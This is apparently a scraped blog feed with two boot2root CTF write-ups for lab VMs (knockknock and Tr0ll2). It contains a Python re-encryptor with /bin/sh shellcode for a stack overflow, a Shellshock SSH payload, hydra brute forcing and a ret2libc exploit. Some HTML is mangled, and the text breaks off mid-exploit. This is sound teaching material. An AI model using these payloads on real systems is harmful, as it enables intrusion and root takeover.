<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img class="<a" src="href="https://i.imgur.com/VPUDXvo.png">https://i.imgur.com/VPUDXvo.png</a>"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/cT7i3ob.png">https://i.imgur.com/cT7i3ob.png</a>"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<p><code>c
int xcrypt(int arg0, int arg1) {
</code></p>

<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<p>```c</p>

<pre><code>var_C = 0xea1ab19f;
var_10 = arg_0;
var_4 = 0x0;
</code></pre>

<p>```</p>

<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<p>```c</p>

<pre><code>while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
        *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
</code></pre>

<p>```</p>

<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<p>```c</p>

<pre><code>        var_8 = 0x0;
        while (var_8 &lt;= 0x7) {
                if ((var_C &amp; 0x1) != 0x0) {
                        var_C = var_C &gt;&gt; 0x1;
                        var_C = var_C ^ 0x6daa1cf4;
                }
                else {
                        var_C = var_C &gt;&gt; 0x1;
                }
                var_8 = var_8 + 0x1;
        }
        var_4 = var_4 + 0x1;
}
</code></pre>

<p>```</p>

<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<p>```c</p>

<pre><code>var_14 = arg_4 &amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp; 0x3) &gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
        var_C = var_C &gt;&gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
</code></pre>

<p>}
```</p>

<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<h1>Hopper Pseudo Code</h1>

<h1>int xcrypt(int arg0, int arg1) {</h1>

<h1>var_C = 0xea1ab19f;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while (arg_4 >> 0x2 > var_4) {</h1>

<h1><em>(var_4 * 0x4 + var_10) = </em>(var_10 + var_4 * 0x4) ^ var_C;</h1>

<h1>var_8 = 0x0;</h1>

<h1>while (var_8 &lt;= 0x7) {</h1>

<h1>if ((var_C &amp; 0x1) != 0x0) {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>}</h1>

<h1>var_14 = arg_4 &amp; 0xfffffffc;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while ((arg_4 &amp; 0x3) > var_4) {</h1>

<h1><em>(int8_t </em>)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ <em>(int8_t </em>)(arg_0 + var_14 + var_4) &amp; 0xff);</h1>

<h1>var_C = var_C >> 0x8;</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>return 0x0;</h1>

<h1>}</h1>

<p>def xcrypt(content, length):</p>

<pre><code>encrypted = ''

# set the base encryption key. this mutates with each pass
key = 0xea1ab19f    # var_C = 0xea1ab19f;

for word in range(length &gt;&gt; 2): # while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
    # apply the encryption logic as can bee seen in
    # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

    # grab the 4 bytes we working with
    bytes = content[word*4:((word*4)+4)]

    # struct unpack_from returns a tuple, we want 0 so that
    # we end up with something we can xor
    long_to_xor = struct.unpack_from('&lt;L', bytes)[0]

    # apply the xor, this is the actual encryption part
    encrypted_bytes = long_to_xor ^ key

    # append the 4 encrypted bytes by packing them
    encrypted += struct.pack('&lt;L',encrypted_bytes)

    # next we run the key mutation 
    for mutation in xrange(8):

        # no mutation is possible of the key is 1111 1111 1111 1111
        if (key &amp; 1) != 0:
            key = key &gt;&gt; 1
            key = key ^ 0x6daa1cf4
        else:
            key = key &gt;&gt; 1  

return encrypted;
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># set the content that we want to encrypt
content = "A" *1000
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<h2>testing the script</h2>

<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<p>```bash
root@kali:~# python make-crypt.py > test.tfc</p>

<p>root@kali:~# head test.tfc
��[�]��C��dl�</p>

<pre><code>          H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s&lt;A��^��
</code></pre>

<p>root@kali:~# ./tfc test.tfc out.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```</p>

<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ r crash.tfc crash-out.tfc</p>

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```</p>

<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>[&hellip; snip &hellip;]</p>

<p>Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
```</p>

<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<p><code>bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
</code></p>

<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<p><code>bash
content = "A" *4124 + "BBBB" + "C"*(6000-4124-4)
</code></p>

<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img class="<a" src="href="https://i.imgur.com/Mqkfe8l.png">https://i.imgur.com/Mqkfe8l.png</a>"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<p><code>bash
content = "A" *4124 + "\x93\x8e\x04\x08" + "C"*(6000-4124-4)
</code></p>

<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<p>```python
if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># 08048e93  ; jmp esp
shellcode = (
    "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
    "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)

content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<p>```bash
jason@knockknock:~$ python make-crypt.py > crash.tfc &amp;&amp; ./tfc crash.tfc crash-out.tfc</p>

<h1>id</h1>

<p>uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
```</p>

<p>pwnd!</p>

<p>As proof, the flag:</p>

<p>```bash</p>

<h1>cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</h1>

<hr />

    <content type="html"><![CDATA[<h2>foreword</h2>

<p><a href="">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>

<p>Here is my experience taming the troll, again.</p>

<!--more-->


<h2>getting started</h2>

<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>

<p>```bash
root@kali:~/Desktop/troll2# nmap -sV &mdash;reason 192.168.56.101</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-10 06:55 SAST

Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```</p>

<p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>

<h2>web server</h2>

<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>

<p><img class="<a" src="href="https://i.imgur.com/7lyyzPS.png">https://i.imgur.com/7lyyzPS.png</a>">
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>

<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>

<p><code>bash
/keep_trying
/dont_bother
/noob
/ok_this_is_it
</code></p>

<p>The content served up at these URLs:</p>

<p><img class="<a" src="href="https://i.imgur.com/yH4vTKx.png">https://i.imgur.com/yH4vTKx.png</a>"></p>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>

<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>

<p>```bash

<p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>

<p><code>bash

</code></p>

<p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>

<p><code>bash
root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
</code></p>

<p>Sweet, so lets print the last line of both and check what the diff is:</p>

<p>```bash
root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
8�z2��p�T�lj\p��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�</p>

<p>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
8�z2��p�T�lj\p��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
```</p>

<p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>

<p><img class="<a" src="href="https://i.imgur.com/oNInvrf.png">https://i.imgur.com/oNInvrf.png</a>"></p>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>

<p><code>bash
root@kali:~# head answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
</code></p>

<p>Looks a lot like base64 hey? Lets try decode it:</p>

<p><code>bash
root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
</code></p>

<p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>

<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>

<p>My guess was that this has to be a password for either the FTP or SSH service.</p>

<h2>ftpee</h2>

<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>

<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>

<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr "\"' " '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>

<p>And finally, it was time to let hydra on the loose.</p>

```</p>

<p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>

<p><code>bash
root@kali:~/Desktop/troll2# chmod 600 noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
</code></p>

<h2>shocking isn&rsquo;t it</h2>

<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>

<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>

<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>

<p><code>bash
root@kali:~# ssh noob@192.168.56.101 -i noob -t '() { :;}; /bin/bash'
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</code></p>

<p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!"</code> before the public key.</p>

<h2>which door leads to r00t</h2>

<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>

<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>

<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>

<p>```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell&hellip;
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2</p>

<pre><code>(/dev/pts/0) at 0:48 ...
</code></pre>

<p>The system is going down for reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
```</p>

<p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>

<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>

<p><code>bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t

</code></p>

<p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>

<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>

<h2>bof bof bof your boat&hellip;</h2>

<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>

<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>

<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>

<p><code>bash
root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
</code></p>

<p>No security? EZ PEZE.</p>

<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>

<p><code>bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" * 500')
Segmentation fault
</code></p>

<p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>

<p>```bash
noob@Tr0ll2:/tmp$ ldd ./r00t</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
/lib/ld-linux.so.2 (0x80000000)
</code></pre>

<p>noob@Tr0ll2:/tmp$ ldd ./r00t</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fff000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
/lib/ld-linux.so.2 (0x80000000)
</code></pre>

<p>```</p>

<p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>

<h2>the exploit</h2>

<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>

<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)
Starting program: /tmp/r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()</p>

<p>(gdb) x/x $eip
0x41414141: Cannot access memory at address 0x41414141
```</p>

<p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>

<p>Lets generate the pattern.</p>

<p>```bash
root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb</p>

<p>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500

[*] Exact match at offset 268
</code></p>

<p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo; <em>268 + &ldquo;BBBB&rdquo;&rsquo;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t $(python -c &lsquo;print &ldquo;A&rdquo; </em>268 + &ldquo;BBBB&rdquo;&rsquo;)</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()</p>

<p>(gdb) x/x $eip
0x42424242: Cannot access memory at address 0x42424242
(gdb)
```</p>

<p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>

<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>

<p>```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t&hellip;done.</p>

<p>(gdb) b *main   # here we break on the main function
Breakpoint 1 at 0x8048444: file bof.c, line 3.</p>

<p>(gdb) r         # here we run the application&hellip;.
Starting program: /tmp/r00t</p>

<p>Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
3   bof.c: No such file or directory.</p>

<p>(gdb) p system  # and leak the locatin of system() in memory
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```</p>

<p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>

<p>So far our exploit payload will look something like this:</p>

<p><code>text
A * 268 + system() + JUNK
</code></p>

<p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>

<p>So lets create this string, which we will refer to as the EGG.</p>

<p><code>bash
noob@Tr0ll2:/tmp$ export EGG=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG=/bin/sh
</code></p>

<p>Next, we can use a small C program to tell us where this EGG is in memory:</p>

<p>```bash
noob@Tr0ll2:/tmp$ cat /tmp/findegg.c</p>

<h1>include &lt;unistd.h></h1>

<p>int main(void)
{
  printf(&ldquo;EGG address: 0x%lx\n&rdquo;, getenv(&ldquo;EGG&rdquo;)+4);
  return 0;
}</p>

<p>noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[&hellip;]</p>

<p>noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
```</p>

<p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>

<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>

<p><code>text
A * 268 + system() + JUNK + EGG
</code></p>

<p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>

<p><code>bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x04\xff\xff\xbf"')
Segmentation fault
</code></p>

<p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>

<p>```bash</p>

<h1>so just to recap, we check for the location of the EGG</h1>

<p>noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04</p>

<h1>EGG is at 0xbfffff04, so in little endian format we have:</h1>

<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x04\xff\xff\xbf&rdquo;&rsquo;)
Segmentation fault</p>

<h1>A segfault, lets move it up 1 byte</h1>

